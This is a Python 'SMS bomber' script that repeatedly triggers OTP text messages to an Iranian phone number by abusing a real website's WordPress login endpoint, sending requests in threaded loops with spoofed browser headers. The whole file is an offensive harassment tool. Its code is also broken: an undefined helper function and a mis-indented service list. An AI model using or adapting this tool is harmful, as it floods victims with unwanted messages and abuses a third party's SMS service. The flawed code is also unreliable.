from platform import node, system, release
from os import system as os_system, name
from re import match, sub
from threading import Thread
import urllib3; urllib3.disable_warnings()
from time import sleep
import random
import socket

try:
    from requests import get, post
except ImportError:
    os_system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'  
g = '\033[32;1m'  
y = '\033[33;1m'  
b = '\033[34;1m'  
p = '\033[35;1m'  
w = '\033[37;1m'  
a = '\033[0m'     
d = '\033[90;1m'  

# System info
Node, System, Release = node(), system(), release()

# Clear screen
os_system('clear' if name == 'posix' else 'cls')

# Slow print
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Check internet
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS services
# ------------------------------

def katonikhan(phone):
    import requests
    
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
    
    try:
        url = "https://katonikhan.com/wp-admin/admin-ajax.php"
        
        payload = {
            "phone": formatted_phone,
            "digt_countrycode": "+98",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "instance_id": "f2cf6e724788dcfaacd48173e7215663",
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "otp",
            "digits": "1",
            "digits_redirect_page": "-1",
            "aio_special_field": "",
            "digits_form": "92e2d882a6",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://katonikhan.com",
            "Referer": "https://katonikhan.com/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
        }
        
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("success") is True:
                print(f'{g}(katonikhan) {a}Code Sent')
                return True
        
        return False
            
    except Exception:
        return False


# Simple SMS bomber
def Vip(phone, Time):
services = [
    katonikhan

]
    total_services = len(services)

    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        os_system('clear' if name == 'posix' else 'cls')  

# Phone validation
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# Menu
def main_menu():
    os_system('clear' if name == 'posix' else 'cls')
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-2): {a}")

# Main loop
def main():
    while True:
        choice = main_menu()

        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Email Bomber is not implemented in this snippet.")

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break

        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

if __name__ == "__main__":
    main()
